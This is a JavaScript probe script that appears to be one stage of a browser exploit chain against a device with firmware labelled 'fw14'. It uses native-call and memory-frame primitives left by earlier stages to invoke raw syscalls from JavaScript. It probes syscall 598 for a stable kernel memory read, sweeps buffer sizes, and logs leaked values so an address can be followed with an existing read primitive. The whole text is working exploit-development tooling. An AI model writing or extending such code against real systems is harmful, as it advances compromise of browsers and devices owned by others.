// Syscall 598 follow-up: the block sweep found 598(buf, sizePtr) returns 0
// with an 8-byte copyout `00 80 ab 12 00 00 00 00` (LE u32 pair 0x12ab8000,
// 0x00000000) and the (buf, value) shape EFAULTs with the SAME 8 bytes
// partially copied — a working 8-byte read plus a faulting tail. This probe:
// (1) repeats the working shape 4× for stability; (2) sweeps the size word
// at sizePtr across 0x8/0x10/0x100/0x1000/0x10000 for extent growth;
// (3) tries the copy with larger buffers; (4) returns every value observed
// so the address can be checked against browser mappings and, if it is a
// process address, followed with the existing read primitive. Read-only;
// sys598 byte-gated by installer v21; safe mark() helper.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("chain_or_sys598_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var bufOffset = 0x200, bufLength = 0x2000 - 0x400;
  var guardOffset = bufOffset + bufLength;
  var sizePtrOffset = 0x1e00;
  var regionEnd = sizePtrOffset + 0x20;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var bufAddress = address + bufOffset;
  var sizeAddress = address + sizePtrOffset;
  var original = Array.from(frame.subarray(bufOffset, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function putSize(value) {
    frame[sizePtrOffset] = value & 255;
    frame[sizePtrOffset + 1] = (value >>> 8) & 255;
    frame[sizePtrOffset + 2] = (value >>> 16) & 255;
    frame[sizePtrOffset + 3] = (value >>> 24) & 255;
    frame[sizePtrOffset + 4] = 0; frame[sizePtrOffset + 5] = 0;
    frame[sizePtrOffset + 6] = 0; frame[sizePtrOffset + 7] = 0;
  }
  function call598(arg2) {
    frame.fill(0, bufOffset, bufOffset + bufLength);
    var call = native.call("sys598", [bufAddress, arg2]);
    var errno = (call.value === -1) ? native.readErrno() : null;
    var extent = 0;
    for (var i = 0; i < bufLength; i++) {
      if (frame[bufOffset + i] !== 0) extent = i + 1;
    }
    var hex = hexAt(bufOffset, Math.min(Math.max(extent, 8), 32));
    var sizeLeft = (frame[sizePtrOffset]) |
                   (frame[sizePtrOffset + 1] << 8) |
                   (frame[sizePtrOffset + 2] << 16) |
                   (frame[sizePtrOffset + 3] << 24);
    return { ret: call.value, errno: errno, extent: extent,
      hex: hex, size_left: sizeLeft };
  }
  function hexAt(offset, count) {
    var out = "";
    for (var i = 0; i < count; i++)
      out += ("0" + frame[offset + i].toString(16)).slice(-2);
    return out;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("sys598_preflight");
  phase = "stability";
  var stability = [];
  for (var s = 0; s < 4; s++) {
    putSize(0x1000);
    var out = call598(sizeAddress);
    stability.push(out.ret + "/" + (out.errno === null ? "ok" :
      out.errno) + "/" + out.hex);
  }
  mark("sys598_stability");
  phase = "size_sweep";
  var sizes = [8, 0x10, 0x100, 0x1000, 0x10000];
  var sizeSweep = [];
  for (var v = 0; v < sizes.length; v++) {
    putSize(sizes[v]);
    var out2 = call598(sizeAddress);
    sizeSweep.push(sizes[v].toString(16) + ":" + out2.ret + "/" +
      (out2.errno === null ? "ok" : out2.errno) + "/ext" + out2.extent +
      "/" + out2.hex.slice(0, 32));
  }
  mark("sys598_size_sweep");
  phase = "value_arg";
  putSize(0x1000);
  var valueArg = call598(0x1000);
  mark("sys598_value_arg");
  for (var r = 0; r < original.length; r++)
    frame[bufOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[bufOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("sys598_done");
  result = { id: "syscall598_probe_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { stability: stability.join(" | "),
      size_sweep: sizeSweep.join(" | "),
      value_arg: valueArg.ret + "/" +
        (valueArg.errno === null ? "ok" : valueArg.errno) +
        "/ext" + valueArg.extent + "/" + valueArg.hex,
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "syscall598_probe_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
